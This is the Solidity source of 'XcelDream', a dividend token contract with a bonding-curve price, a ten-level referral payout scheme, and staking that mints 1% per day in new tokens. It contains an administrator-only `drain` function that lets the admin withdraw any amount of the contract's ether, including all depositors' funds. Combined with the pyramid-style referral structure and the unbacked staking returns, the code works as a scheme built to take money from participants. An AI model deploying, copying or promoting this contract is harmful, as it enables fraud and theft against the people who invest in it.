
pragma solidity ^0.4.20;

library SafeMath {

    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {

        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract XcelDream {

    
    
    string public name                                      = "XcelDream";
    string public symbol                                    = "XDM";
    uint8 constant public decimals                          = 18;
    uint8 constant internal dividendFee_                    = 5;
    uint8 constant internal referralPer_                    = 20;
    uint8 constant internal developerFee_                   = 5;
    uint8 internal stakePer_                                = 1;
    uint256 constant internal tokenPriceInitial_            = 0.0001 ether;
    uint256 constant internal tokenPriceIncremental_        = 0.000001 ether;
    uint256 constant internal tokenPriceDecremental_        = 0.0000014 ether;
    uint256 constant internal magnitude                     = 2**64;
    
    uint256 public stakingRequirement                       = 1e18;
    
    mapping(address => bool) internal ambassadors_;
    uint256 constant internal ambassadorMaxPurchase_        = 1 ether;
    uint256 constant internal ambassadorQuota_              = 1 ether;
    
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    mapping(address => uint256) internal stakingTime_;
    mapping(address => uint256) internal referralBalance_;
    
    mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
    
    mapping(address => int256) internal payoutsTo_;
    mapping(address => uint256) internal ambassadorAccumulatedQuota_;
    uint256 internal tokenSupply_                           = 0;
    uint256 internal developerBalance                       = 0;
    uint256 internal profitPerShare_;
    
    mapping(bytes32 => bool) public administrators;
    bool public onlyAmbassadors = false;
    
    
    modifier onlybelievers () {

        require(myTokens() > 0);
        _;
    }
    
    modifier onlyhodler() {

        require(myDividends(true) > 0);
        _;
    }
    
    modifier onlyAdministrator(){

        address _customerAddress = msg.sender;
        require(administrators[keccak256(_customerAddress)]);
        _;
    }
    
    modifier antiEarlyWhale(uint256 _amountOfEthereum){

        address _customerAddress = msg.sender;
        if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
            require(
                ambassadors_[_customerAddress] == true &&
                (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
            );
            ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
            _;
        } else {
            onlyAmbassadors = false;
            _;    
        }
    }
    
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 ethereumEarned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
    
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
    
    function XcelDream() public {

        administrators[0xd44dea3678f826c0c142f05bdfdf646d04def08a04620100e2778d78e59600f0] = true;
        ambassadors_[0x0000000000000000000000000000000000000000] = true;
    }
     
    function buy(address _referredBy) public payable returns(uint256) {

        purchaseTokens(msg.value, _referredBy);
    }
    
    function() payable public {
        purchaseTokens(msg.value, 0x0);
    }
    
    function reinvest() onlyhodler() public {

        uint256 _dividends                  = myDividends(false); // retrieve ref. bonus later in the code
        address _customerAddress            = msg.sender;
        payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
        _dividends                          += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress]  = 0;
        uint256 _tokens                     = purchaseTokens(_dividends, 0x0);
        onReinvestment(_customerAddress, _dividends, _tokens);
    }
    
    function exit() public {

        address _customerAddress            = msg.sender;
        uint256 _tokens                     = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
        withdraw();
    }

    function withdraw() onlyhodler() public {

        address _customerAddress            = msg.sender;
        uint256 _dividends                  = myDividends(false); // get ref. bonus later in the code
        payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
        _dividends                          += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress]  = 0;
        _customerAddress.transfer(_dividends);
        onWithdraw(_customerAddress, _dividends);
    }
    
    function sell(uint256 _amountOfTokens) onlybelievers () public {

        address _customerAddress            = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens                     = _amountOfTokens;
        uint256 _ethereum                   = tokensToEthereum_(_tokens);
        uint256 _dividends                  = SafeMath.percent(_ethereum,dividendFee_,100,18);
        uint256 _taxedEthereum              = SafeMath.sub(_ethereum, _dividends);
        tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        int256 _updatedPayouts              = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
        payoutsTo_[_customerAddress]        -= _updatedPayouts;       
        if (tokenSupply_ > 0) {
            profitPerShare_                 = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
        }
        onTokenSell(_customerAddress, _tokens, _taxedEthereum);
    }
    
    function transfer(address _toAddress, uint256 _amountOfTokens) onlybelievers () public returns(bool) {

        address _customerAddress            = msg.sender;
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        if(myDividends(true) > 0) withdraw();
        uint256 _tokenFee                   = SafeMath.percent(_amountOfTokens,dividendFee_,100,18);
        uint256 _taxedTokens                = SafeMath.sub(_amountOfTokens, _tokenFee);
        uint256 _dividends                  = tokensToEthereum_(_tokenFee);
        tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokenFee);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress]     = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
        payoutsTo_[_customerAddress]        -= (int256) (profitPerShare_ * _amountOfTokens);
        payoutsTo_[_toAddress]              += (int256) (profitPerShare_ * _taxedTokens);
        profitPerShare_                     = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
        Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
    }
    
    function disableInitialStage() onlyAdministrator() public {

        onlyAmbassadors                     = false;
    }
    
    function changeStakePercent(uint8 stakePercent) onlyAdministrator() public {

        stakePer_                           = stakePercent;
    }
    
    function setAdministrator(bytes32 _identifier, bool _status) onlyAdministrator() public {

        administrators[_identifier]         = _status;
    }
    
    function setStakingRequirement(uint256 _amountOfTokens) onlyAdministrator() public {

        stakingRequirement                  = _amountOfTokens;
    }
    
    function setName(string _name) onlyAdministrator() public {

        name                                = _name;
    }
    
    function setSymbol(string _symbol) onlyAdministrator() public {

        symbol                              = _symbol;
    }
    
    function drain(uint256 _ethereumToDrain) external onlyAdministrator {

        address _adminAddress = msg.sender;
        require(this.balance >= _ethereumToDrain);
        _adminAddress.transfer(_ethereumToDrain);
    }
    
    function drainDeveloperFees() external onlyAdministrator {

        address _adminAddress   = msg.sender;
        _adminAddress.transfer(developerBalance);
        developerBalance        = 0;
    }
    
    function totalEthereumBalance() public view returns(uint) {

        return this.balance;
    }
    function totalDeveloperBalance() public view returns(uint) {

        return developerBalance;
    }
    function totalSupply() public view returns(uint256) {

        return tokenSupply_;
    }
    
    function myTokens() public view returns(uint256) {

        address _customerAddress            = msg.sender;
        return balanceOf(_customerAddress);
    }
    
    function myDividends(bool _includeReferralBonus) public view returns(uint256) {

        address _customerAddress            = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }
    
    function balanceOf(address _customerAddress) view public returns(uint256) {

        return tokenBalanceLedger_[_customerAddress];
    }
    
    function dividendsOf(address _customerAddress) view public returns(uint256) {

        return (uint256) ((int256)(profitPerShare_ * (tokenBalanceLedger_[_customerAddress] + stakeBalanceLedger_[_customerAddress])) - payoutsTo_[_customerAddress]) / magnitude;
    }
    
    function sellPrice() public view returns(uint256) {

        if(tokenSupply_ == 0){
            return tokenPriceInitial_       - tokenPriceDecremental_;
        } else {
            uint256 _ethereum               = tokensToEthereum_(1e18);
            uint256 _dividends              = SafeMath.percent(_ethereum,dividendFee_,100,18);
            uint256 _taxedEthereum          = SafeMath.sub(_ethereum, _dividends);
            return _taxedEthereum;
        }
    }
    
    function buyPrice() public view returns(uint256) {

        if(tokenSupply_ == 0){
            return tokenPriceInitial_       + tokenPriceIncremental_;
        } else {
            uint256 _ethereum               = tokensToEthereum_(1e18);
            uint256 untotalDeduct           = developerFee_ + referralPer_ + dividendFee_;
            uint256 totalDeduct             = SafeMath.percent(_ethereum,untotalDeduct,100,18);
            uint256 _taxedEthereum          = SafeMath.add(_ethereum, totalDeduct);
            return _taxedEthereum;
        }
    }
   
    function calculateTokensReceived(uint256 _ethereumToSpend) public view returns(uint256) {

        uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_;
        uint256 totalDeduct                 = SafeMath.percent(_ethereumToSpend,untotalDeduct,100,18);
        uint256 _taxedEthereum              = SafeMath.sub(_ethereumToSpend, totalDeduct);
        uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
        return _amountOfTokens;
    }
   
    function calculateEthereumReceived(uint256 _tokensToSell) public view returns(uint256) {

        require(_tokensToSell <= tokenSupply_);
        uint256 _ethereum                   = tokensToEthereum_(_tokensToSell);
        uint256 _dividends                  = SafeMath.percent(_ethereum,dividendFee_,100,18);
        uint256 _taxedEthereum              = SafeMath.sub(_ethereum, _dividends);
        return _taxedEthereum;
    }
    
    function stakeTokens(uint256 _amountOfTokens) onlybelievers () public returns(bool){

        address _customerAddress            = msg.sender;
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _amountOfTokensWith1Token   = SafeMath.sub(_amountOfTokens, 1e18);
        stakingTime_[_customerAddress]      = now;
        stakeBalanceLedger_[_customerAddress] = SafeMath.add(stakeBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
    }
    
    function stakeTokensBalance(address _customerAddress) public view returns(uint256){

        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
        uint256 dayscount                   = SafeMath.div(timediff, 86400); //86400 Sec for 1 Day
        uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
        uint256 roiTokens                   = SafeMath.percent(stakeBalanceLedger_[_customerAddress],roiPercent,100,18);
        uint256 finalBalance                = SafeMath.add(stakeBalanceLedger_[_customerAddress],roiTokens);
        return finalBalance;
    }
    
    function stakeTokensTime(address _customerAddress) public view returns(uint256){

        return stakingTime_[_customerAddress];
    }
    
    function releaseStake() onlybelievers () public returns(bool){

        address _customerAddress            = msg.sender;
        require(!onlyAmbassadors && stakingTime_[_customerAddress] > 0);
        uint256 _amountOfTokens             = stakeBalanceLedger_[_customerAddress];
        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
        uint256 dayscount                   = SafeMath.div(timediff, 86400);
        uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
        uint256 roiTokens                   = SafeMath.percent(_amountOfTokens,roiPercent,100,18);
        uint256 finalBalance                = SafeMath.add(_amountOfTokens,roiTokens);
        
        tokenSupply_                        = SafeMath.add(tokenSupply_, roiTokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], finalBalance);
        stakeBalanceLedger_[_customerAddress] = 0;
        stakingTime_[_customerAddress]      = 0;
        
    }
    
    
    uint256 developerFee;
    uint256 incETH;
    address _refAddress; 
    uint256 _referralBonus;
    
    uint256 bonusLv1;
    uint256 bonusLv2;
    uint256 bonusLv3;
    uint256 bonusLv4;
    uint256 bonusLv5;
    uint256 bonusLv6;
    uint256 bonusLv7;
    uint256 bonusLv8;
    uint256 bonusLv9;
    uint256 bonusLv10;
    
    address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
    function getDownlineRef(address senderAddress, uint dataId) external view returns (address,uint) { 

        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {

        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    function getref(address _customerAddress, uint _level) public view returns(address lv) {

        if(_level == 1) {
            lv = referralLevel1Address[_customerAddress];
        } else if(_level == 2) {
            lv = referralLevel2Address[_customerAddress];
        } else if(_level == 3) {
            lv = referralLevel3Address[_customerAddress];
        } else if(_level == 4) {
            lv = referralLevel4Address[_customerAddress];
        } else if(_level == 5) {
            lv = referralLevel5Address[_customerAddress];
        } else if(_level == 6) {
            lv = referralLevel6Address[_customerAddress];
        } else if(_level == 7) {
            lv = referralLevel7Address[_customerAddress];
        } else if(_level == 8) {
            lv = referralLevel8Address[_customerAddress];
        } else if(_level == 9) {
            lv = referralLevel9Address[_customerAddress];
        } else if(_level == 10) {
            lv = referralLevel10Address[_customerAddress];
        } 
        return lv;
    }
    
    function distributeRefBonus(uint256 _incomingEthereum, address _referredBy, address _sender, bool _newReferral) internal {

        address _customerAddress        = _sender;
        uint256 remainingRefBonus       = _incomingEthereum;
        _referralBonus                  = _incomingEthereum;
        
        bonusLv1                        = SafeMath.percent(_referralBonus,30,100,18);
        bonusLv2                        = SafeMath.percent(_referralBonus,20,100,18);
        bonusLv3                        = SafeMath.percent(_referralBonus,15,100,18);
        bonusLv4                        = SafeMath.percent(_referralBonus,10,100,18);
        bonusLv5                        = SafeMath.percent(_referralBonus,5,100,18);
        bonusLv6                        = SafeMath.percent(_referralBonus,5,100,18);
        bonusLv7                        = SafeMath.percent(_referralBonus,5,100,18);
        bonusLv8                        = SafeMath.percent(_referralBonus,3,100,18);
        bonusLv9                        = SafeMath.percent(_referralBonus,3,100,18);
        bonusLv10                       = SafeMath.percent(_referralBonus,2,100,18);
        
        referralLevel1Address[_customerAddress]                     = _referredBy;
        referralBalance_[referralLevel1Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel1Address[_customerAddress]], bonusLv1);
        remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv1);
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
        
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            referralBalance_[referralLevel2Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel2Address[_customerAddress]], bonusLv2);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv2);
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            referralBalance_[referralLevel3Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel3Address[_customerAddress]], bonusLv3);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv3);
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            referralBalance_[referralLevel4Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel4Address[_customerAddress]], bonusLv4);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv4);
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            referralBalance_[referralLevel5Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel5Address[_customerAddress]], bonusLv5);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv5);
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            referralBalance_[referralLevel6Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel6Address[_customerAddress]], bonusLv6);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv6);
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
            referralBalance_[referralLevel7Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel7Address[_customerAddress]], bonusLv7);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv7);
            if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            referralBalance_[referralLevel8Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel8Address[_customerAddress]], bonusLv8);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv8);
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            referralBalance_[referralLevel9Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel9Address[_customerAddress]], bonusLv9);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv9);
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            referralBalance_[referralLevel10Address[_customerAddress]]  = SafeMath.add(referralBalance_[referralLevel10Address[_customerAddress]], bonusLv10);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv10);
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
        
        developerBalance                    = SafeMath.add(developerBalance, remainingRefBonus);
    }

    function purchaseTokens(uint256 _incomingEthereum, address _referredBy) antiEarlyWhale(_incomingEthereum) internal returns(uint256) {

        address _customerAddress            = msg.sender;
        incETH                              = _incomingEthereum;
        developerFee                        = SafeMath.percent(incETH,developerFee_,100,18);
        developerBalance                    = SafeMath.add(developerBalance, developerFee);
        
        _referralBonus                      = SafeMath.percent(incETH,referralPer_,100,18);
        
        uint256 _dividends                  = SafeMath.percent(incETH,dividendFee_,100,18);
        
        uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_;
        uint256 totalDeduct                 = SafeMath.percent(incETH,untotalDeduct,100,18);
        
        uint256 _taxedEthereum              = SafeMath.sub(incETH, totalDeduct);
        uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
        uint256 _fee                        = _dividends * magnitude;
        bool    _newReferral                = true;
        if(referralLevel1Address[_customerAddress] != 0x0000000000000000000000000000000000000000) {
            _referredBy                     = referralLevel1Address[_customerAddress];
            _newReferral                    = false;
        }
        
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        if(
            _referredBy != 0x0000000000000000000000000000000000000000 &&
            _referredBy != _customerAddress &&
            tokenBalanceLedger_[_referredBy] >= stakingRequirement
        ){
            distributeRefBonus(_referralBonus,_referredBy,_customerAddress,_newReferral);
        } else {
            developerBalance                = SafeMath.add(developerBalance, _referralBonus);
        }
        if(tokenSupply_ > 0){
            tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
            profitPerShare_                 += (_dividends * magnitude / (tokenSupply_));
            _fee                            = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
        } else {
            tokenSupply_                    = _amountOfTokens;
        }
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        int256 _updatedPayouts              = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
        payoutsTo_[_customerAddress]        += _updatedPayouts;
        onTokenPurchase(_customerAddress, incETH, _amountOfTokens, _referredBy);
        return _amountOfTokens;
    }

    function ethereumToTokens_(uint256 _ethereum) internal view returns(uint256) {

        uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived             = 
         (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_)
        ;

        return _tokensReceived;
    }
    
     function tokensToEthereum_(uint256 _tokens) internal view returns(uint256) {

        uint256 tokens_                     = (_tokens + 2e18);
        uint256 _tokenSupply                = (tokenSupply_ + 2e18);
        uint256 _etherReceived              =
        (
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/2e18))
                        )-tokenPriceDecremental_
                    )*(tokens_ - 2e18)
                ),(tokenPriceDecremental_*((tokens_**2-tokens_)/2e18))/2
            )
        /2e18);
        return _etherReceived;
    }
    
    function sqrt(uint x) internal pure returns (uint y) {

        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
}